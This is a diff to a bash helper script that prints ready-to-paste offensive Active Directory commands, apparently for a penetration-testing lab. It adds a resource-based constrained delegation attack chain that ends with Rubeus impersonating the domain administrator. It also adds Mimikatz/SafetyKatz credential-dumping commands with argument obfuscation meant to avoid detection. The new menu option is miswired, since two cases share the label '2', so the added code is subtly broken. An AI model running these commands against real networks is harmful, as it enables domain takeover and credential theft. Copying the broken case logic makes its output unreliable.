@@ -8,7 +8,7 @@ nb-ad-pwsh-help() {
 
 nb-ad-pwsh
 ------------
-The nb-ad-pwsh namespace contains commands for powershell/powerviwe commands to copy/paste to a windows machine.
+The nb-ad-pwsh namespace contains commands for powershell/powerview commands to copy/paste to a windows machine.
 
 PowerView Enumeration
 ---------------------
@@ -57,6 +57,45 @@ nb-ad-pwsh-ping                sweep a network subnet with ping requests on wind
 nb-ad-cmd-ping                 sweep a network subnet with ping requests on windows
 
 DOC
+}
+
+nb-ad-pwsh-rbcd() {
+    __check-project
+    __info "Find a user that has write permission over a computer object (check ObjectDN's first 'CN='):"
+    __ok "nb-ad-pwsh-enum-acls"
+    echo
+    __warn "You must first log into the user that has write permissions, you can do that with OPTH:"
+    __ok "nb-ad-pwsh-opth"
+    echo
+    __warn "Load PowerView with:"
+    __ok ". .\\PowerView.ps1"
+    __ok "nb-pwsh-file-download    - Execute in memory"
+    echo
+    __ask "Enter the hostname of computer object over which the user has write permissions"
+    local hostname && __askvar hostname HOSTNAME
+    __ask "Enter my windows machine's hostname to give myself write permissions"
+    local hostname2 && __askvar hostname2 HOSTNAME
+    echo
+    __info "Command to set RBCD on dcorp-mgmt for the student:"
+    __ok "Set-DomainRBCD -Identity ${hostname} -DelegateFrom '${hostname2}$' -Verbose"
+    echo
+    __info "You can check if RBCD is set correctly:"
+    __ok "Get-DomainRBCD"
+    echo
+    __info "Next, you need to get AES256 keys of your machine which you gave the write permissios to using command:"
+    __ok "nb-ad-pwsh-dump-secrets"
+    echo
+    __ask "Enter the AES256 hash of your machine"
+    __check-hash
+    echo
+    __warn "Encode the following command with: .\\ArgSplit.bat:"
+    __ok "s4u"
+    echo
+    __info "Now, abuse the RBCD to access dcorp-mgmt as Domain Administrator - Administrator"
+    __ok "C:\\\\AD\\\\Tools\\\\Loader.exe -path C:\\\\AD\\\\Tools\\\\Rubeus.exe -args %Pwn% /user:$hostname2\$ /aes256:${__HASH} /msdsspn:http/$hostname /impersonateuser:administrator /ptt"
+    echo
+    __info "Check if we can access dcorp-mgmt with command:"
+    __ok "nb-ad-cmd-winrs"
 }
 
 nb-ad-pwsh-constrained-machine() {
@@ -235,7 +274,7 @@ nb-ad-pwsh-enum-acls() {
           echo
           nb-vars-set-user
           echo
-          __info "Find a computer object in dcorp domain where we have Write permissions"
+          __info "Find a computer object in dcorp domain where we have Write permissions over given computer object"
           __COMMAND="Find-InterestingDomainACL | ?{\$_.identityreferencename -match '${__USER}'}";;
         8) 
           echo
@@ -418,15 +457,25 @@ nb-ad-pwsh-enum-domain() {
 
 nb-ad-pwsh-dump-secrets() {
     clear
+    __warn "You must use an elevated command prompt."
 
+    echo
     __warn "Load Invoke-Mimi with:"
     __ok ". .\\Invoke-Mimi.ps1"
     __ok "nb-pwsh-file-download    - Execute in memory"
 
     echo
+    __warn "If you're using SafetyKatz.exe, you need to encode the command with: .\\ArgSplit.bat:"
+    __ok "sekurlsa::ekeys"
+    echo
+    __ask "Then check the encoded command with:"
+    __ok "echo %Pwn%"
+
+    echo
     __ask "Choose a command to copy:"
     echo "1. Invoke-Mimi -Command '\"sekurlsa::ekeys\"'"
     echo "2. Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'"
+    echo "3. C:\\\\AD\\\\Tools\\\\Loader.exe -Path C:\\\\AD\\\\Tools\\\\SafetyKatz.exe -args \"%Pwn%\" \"exit\""
     echo
     echo -n "Choice: "
     read choice
@@ -434,11 +483,13 @@ nb-ad-pwsh-dump-secrets() {
     case $choice in
         1) __COMMAND="Invoke-Mimi -Command '\"sekurlsa::ekeys\"'";;
         2) __COMMAND="Invoke-Mimi -Command '\"token::elevate\" \"vault::cred /patch\"'";;
+        2) __COMMAND="C:\\\\AD\\\\Tools\\\\Loader.exe -Path C:\\\\AD\\\\Tools\\\\SafetyKatz.exe -args \"%Pwn%\" \"exit\"";;
         3) exit;;
         *) echo "Invalid option"; exit;;
     esac
 
     echo "$__COMMAND" | wl-copy
+    echo
     __info "Command copied to clipboard"
     __ok "$__COMMAND"
 }
